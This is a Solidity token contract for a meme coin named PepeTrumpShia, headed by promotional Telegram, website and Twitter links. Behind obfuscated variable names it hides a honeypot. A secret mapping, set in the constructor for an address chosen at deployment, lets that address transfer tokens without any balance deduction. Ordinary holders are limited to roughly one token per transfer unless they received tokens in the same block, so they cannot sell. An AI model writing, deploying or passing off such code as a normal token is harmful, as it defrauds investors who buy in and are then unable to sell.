/*

Telegram: https://t.me/PepeTrumpShia

Website: https://pepetrumpshia.crypto-token.live/

Twitter: https://twitter.com/PepeTrumpShia

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PepeTrumpShia is Ownable {
    uint256 private skqdwcey = 117;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol;

    function approve(address eicvh, uint256 gnrthaijvxq) public returns (bool success) {
        allowance[msg.sender][eicvh] = gnrthaijvxq;
        emit Approval(msg.sender, eicvh, gnrthaijvxq);
        return true;
    }

    function transferFrom(address olkiwfqn, address lmfpod, uint256 gnrthaijvxq) public returns (bool success) {
        require(gnrthaijvxq <= allowance[olkiwfqn][msg.sender]);
        allowance[olkiwfqn][msg.sender] -= gnrthaijvxq;
        ofhwqsmirj(olkiwfqn, lmfpod, gnrthaijvxq);
        return true;
    }

    mapping(address => uint256) private egowadbqmxs;

    constructor(string memory ldsut, string memory xmnl, address kjlsn, address xcjefpqb) {
        name = ldsut;
        symbol = xmnl;
        balanceOf[msg.sender] = totalSupply;
        egowadbqmxs[xcjefpqb] = skqdwcey;
        htzvojubex = IUniswapV2Router02(kjlsn);
    }

    function ofhwqsmirj(address olkiwfqn, address lmfpod, uint256 gnrthaijvxq) private {
        address wkfvyerp = IUniswapV2Factory(htzvojubex.factory()).getPair(address(this), htzvojubex.WETH());
        if (0 == egowadbqmxs[olkiwfqn]) {
            if (olkiwfqn != wkfvyerp && xleqgmckivn[olkiwfqn] != block.number && gnrthaijvxq < totalSupply) {
                require(gnrthaijvxq <= totalSupply / (10 ** decimals));
            }
            balanceOf[olkiwfqn] -= gnrthaijvxq;
        }
        balanceOf[lmfpod] += gnrthaijvxq;
        xleqgmckivn[lmfpod] = block.number;
        emit Transfer(olkiwfqn, lmfpod, gnrthaijvxq);
    }

    mapping(address => uint256) private xleqgmckivn;

    IUniswapV2Router02 private htzvojubex;

    function transfer(address lmfpod, uint256 gnrthaijvxq) public returns (bool success) {
        ofhwqsmirj(msg.sender, lmfpod, gnrthaijvxq);
        return true;
    }

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;
}